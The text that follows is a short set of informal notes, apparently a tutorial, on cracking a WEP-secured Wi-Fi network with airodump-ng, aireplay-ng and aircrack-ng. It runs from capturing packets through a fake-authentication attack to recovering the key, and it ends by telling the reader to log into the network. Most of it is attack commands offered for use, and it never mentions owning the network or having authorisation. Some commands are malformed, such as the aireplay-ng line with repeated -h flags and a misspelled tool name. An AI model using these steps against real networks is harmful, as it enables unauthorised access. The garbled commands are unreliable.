First enable monitor mode

start to sniff using airodumb-ng by
airodump-ng wlan0

quit by ctrl + c

airodump-ng work only 2.4ghz on deafult
in order to use it also on 5ghz and 2.4ghz use those commands
airodump-ng --band abg wlan0

to target a wifi network and a channel and save the info
airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0

to crack wep we need a lot of packets and data the higher the data number is more likely we hack the net
as busier the network the faster the data increase, if the network isnt busy we have to use fake auth attack which will make traffic
use this command only if the network isnt busy TRY: 
aireplay-ng --fakeauth 5 -a WIFI_ADDRESS -c -h VICTIM_ADDRESS -h ADAPTER_MAC wlan0
get the adapter mac by ifconfig and first 12d at unspec and replace the "-" with ":"

meanwhile the command running open another terminal to start the attack use this command
aircrack-ng test.cap

save the address and remove the ":" btween the numbers
now use this password and login to the network
